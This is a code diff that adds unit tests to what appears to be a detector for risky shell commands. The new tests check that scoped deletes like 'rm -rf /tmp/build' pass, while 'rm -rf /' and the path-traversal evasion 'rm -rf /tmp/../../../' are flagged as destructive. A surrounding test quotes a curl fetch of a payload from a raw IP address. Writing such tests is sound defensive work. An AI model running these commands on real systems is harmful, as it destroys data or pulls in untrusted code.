@@ -46,6 +46,22 @@ class TestDirectIPSuspicion:
                                                 steps=["curl http://45.33.12.99/payload"])
 
 
+class TestScopedRmVsTraversal:
+    def test_scoped_tmp_path_is_not_destructive(self):
+        # The point of the rm -rf fix: a genuinely-scoped path is benign.
+        assert "DESTRUCTIVE" not in _categories("Clean up: `rm -rf /tmp/build`\n",
+                                                 steps=["rm -rf /tmp/build"])
+
+    def test_root_rm_still_destructive(self):
+        assert "DESTRUCTIVE" in _categories("`rm -rf /`\n", steps=["rm -rf /"])
+
+    def test_tmp_path_traversal_to_root_still_destructive(self):
+        # `/tmp/../../../` escapes /tmp back to root — the scoped-path allowance
+        # must NOT give this evasion a pass.
+        assert "DESTRUCTIVE" in _categories("`rm -rf /tmp/../../../`\n",
+                                            steps=["rm -rf /tmp/../../../"])
+
+
 class TestWebhookCapabilityVsExfiltration:
     def test_benign_webhook_post_is_capability(self):
         body = "Notify via webhook:\n`curl -s -X POST \"$WEBHOOK\" -d '{\"content\":\"done\"}'`\n"
